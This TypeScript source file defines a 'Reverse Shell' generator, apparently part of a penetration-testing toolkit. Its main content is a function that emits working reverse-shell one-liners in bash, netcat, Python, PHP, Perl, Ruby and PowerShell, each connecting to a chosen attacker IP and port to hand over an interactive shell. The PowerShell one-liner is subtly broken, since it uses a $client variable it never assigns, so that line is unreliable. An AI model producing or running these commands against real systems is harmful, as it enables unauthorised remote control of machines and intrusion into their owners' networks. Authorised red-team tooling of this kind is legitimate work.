import type { GeneratorConfig } from '../../types/generator';

export const reverseShellGenerator: GeneratorConfig = {
  id: 'reverse-shell',
  name: 'Reverse Shell',
  description: 'Generate various types of one-liner reverse shells.',
  categoryId: 'exploitation',
  exampleUsage: 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1',
  explanation: 'A reverse shell is a shell session established on a connection that is initiated from a remote machine, not from the local host. Attackers use reverse shells to bypass firewalls and gain interactive access.',
  fields: [
    {
      id: 'lhost',
      label: 'LHOST (Attacker IP)',
      type: 'text',
      placeholder: '10.0.0.1',
      required: true,
      defaultValue: '',
      description: 'The IP address to connect back to.'
    },
    {
      id: 'lport',
      label: 'LPORT (Attacker Port)',
      type: 'number',
      placeholder: '4444',
      required: true,
      defaultValue: 4444,
      description: 'The port to connect back to.'
    },
    {
      id: 'shellType',
      label: 'Shell Type',
      type: 'select',
      options: [
        { label: 'Bash', value: 'bash' },
        { label: 'Netcat (Traditional)', value: 'nc' },
        { label: 'Netcat (OpenBSD)', value: 'nc-mkfifo' },
        { label: 'Python', value: 'python' },
        { label: 'PHP', value: 'php' },
        { label: 'Perl', value: 'perl' },
        { label: 'Ruby', value: 'ruby' },
        { label: 'PowerShell', value: 'powershell' }
      ],
      defaultValue: 'bash'
    },
    {
      id: 'shell',
      label: 'Shell Executable',
      type: 'select',
      options: [
        { label: '/bin/sh', value: '/bin/sh' },
        { label: '/bin/bash', value: '/bin/bash' },
        { label: 'cmd.exe', value: 'cmd.exe' },
        { label: 'powershell.exe', value: 'powershell.exe' }
      ],
      defaultValue: '/bin/bash'
    }
  ],
  generateCommand: (values: any) => {
    const ip = values.lhost || '<ip>';
    const port = values.lport || '<port>';
    const sh = values.shell || '/bin/bash';
    
    switch (values.shellType) {
      case 'bash':
        return `bash -c '${sh} -i >& /dev/tcp/${ip}/${port} 0>&1'`;
      case 'nc':
        return `nc -e ${sh} ${ip} ${port}`;
      case 'nc-mkfifo':
        return `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|${sh} -i 2>&1|nc ${ip} ${port} >/tmp/f`;
      case 'python':
        return `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${ip}",${port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["${sh}","-i"]);'`;
      case 'php':
        return `php -r '$sock=fsockopen("${ip}",${port});exec("${sh} -i <&3 >&3 2>&3");'`;
      case 'perl':
        return `perl -e 'use Socket;$i="${ip}";$p=${port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("${sh} -i");};'`;
      case 'ruby':
        return `ruby -rsocket -e'f=TCPSocket.open("${ip}",${port}).to_i;exec sprintf("${sh} -i <&%d >&%d 2>&%d",f,f,f)'`;
      case 'powershell':
        return `powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("${ip}",${port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()`;
      default:
        return `bash -c '${sh} -i >& /dev/tcp/${ip}/${port} 0>&1'`;
    }
  }
};
